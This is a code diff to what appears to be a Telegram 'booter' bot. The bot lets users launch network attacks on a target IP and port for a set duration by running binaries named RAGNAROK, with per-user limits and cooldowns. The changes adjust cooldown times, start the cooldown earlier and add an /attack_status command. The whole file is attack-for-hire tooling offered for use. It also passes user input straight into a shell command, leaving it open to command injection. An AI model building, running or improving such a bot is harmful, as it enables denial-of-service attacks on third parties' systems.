@@ -24,10 +24,10 @@ USER_FILE = "users.txt"
 
 # Cooldowns and binaries for each attack
 attack_cooldowns = {
-    'attack1': {'cooldown': 280, 'last_used': None, 'binary': 'RAGNAROK'},
+    'attack1': {'cooldown': 240, 'last_used': None, 'binary': 'RAGNAROK'},
     'attack2': {'cooldown': 300, 'last_used': None, 'binary': 'RAGNAROK1'},
-    'attack3': {'cooldown': 320, 'last_used': None, 'binary': 'RAGNAROK2'},
-    'attack4': {'cooldown': 400, 'last_used': None, 'binary': 'RAGNAROK3'},
+    'attack3': {'cooldown': 280, 'last_used': None, 'binary': 'RAGNAROK2'},
+    'attack4': {'cooldown': 300, 'last_used': None, 'binary': 'RAGNAROK3'},
     'attack5': {'cooldown': 340, 'last_used': None, 'binary': 'RAGNAROK4'}
 }
 
@@ -81,9 +81,11 @@ def handle_attack(message):
 
     # Ensure cooldown is respected
     now = datetime.datetime.now()
+
+    # Apply cooldown check and start cooldown immediately when attack is initiated
     if attack_data['last_used'] and (now - attack_data['last_used']).seconds < cooldown:
         remaining = cooldown - (now - attack_data['last_used']).seconds
-        bot.reply_to(message, f"⏳ **{command} is on cooldown:** `{remaining} seconds` remaining.\nCooldown started now.")
+        bot.reply_to(message, f"⏳ **{command} is on cooldown:** `{remaining} seconds` remaining.")
         return
 
     # Check usage requirements
@@ -118,24 +120,27 @@ def handle_attack(message):
 
     # Execute the attack
     full_command = f"./{binary} {target} {port} {time_duration}"
-    bot.reply_to(
-        message,
-        f"🚀 **Attack Initiated!**\n"
-        f"📍 **Target:** `{target}`\n"
-        f"🔢 **Port:** `{port}`\n"
-        f"⏱ **Duration:** `{time_duration} seconds`\n"
-        f"🧮 **Remaining Attacks:** `{ATTACK_LIMIT - user['attacks'] - 1}`"
-    )
-
     try:
+        bot.reply_to(
+            message,
+            f"🚀 **Attack Initiated!**\n"
+            f"📍 **Target:** `{target}`\n"
+            f"🔢 **Port:** `{port}`\n"
+            f"⏱ **Duration:** `{time_duration} seconds`\n"
+            f"🧮 **Remaining Attacks:** `{ATTACK_LIMIT - user['attacks'] - 1}`"
+        )
+
+        # Start cooldown immediately here, before executing attack
+        attack_data['last_used'] = now
+
+        # Execute the attack
         subprocess.run(full_command, shell=True)
         bot.reply_to(message, f"✅ **Attack Completed Successfully!**")
     except Exception as e:
         bot.reply_to(message, f"❌ Execution Error: {str(e)}")
         return
 
-    # Update cooldown and user data
-    attack_data['last_used'] = now
+    # Update user data after attack
     user['attacks'] += 1
     save_users()
 
@@ -188,6 +193,19 @@ def reset_user(message):
     save_users()
     bot.reply_to(message, f"✅ **Attack limit reset for User ID:** `{user_id}`")
 
+# Command to check all cooldowns
+@bot.message_handler(commands=['attack_status'])
+def attack_status(message):
+    status = "📊 **Attack Cooldown Status:**\n\n"
+    now = datetime.datetime.now()
+    for cmd, data in attack_cooldowns.items():
+        if data['last_used'] and (now - data['last_used']).seconds < data['cooldown']:
+            remaining = data['cooldown'] - (now - data['last_used']).seconds
+            status += f"⏳ **/{cmd}:** Remaining `{remaining}/{data['cooldown']} seconds`\n"
+        else:
+            status += f"✅ **/{cmd}:** Ready to use.\n"
+    bot.reply_to(message, status)
+    
 # Admin command: Set cooldown for a specific attack
 @bot.message_handler(commands=['setcooldown'])
 def set_cooldown(message):
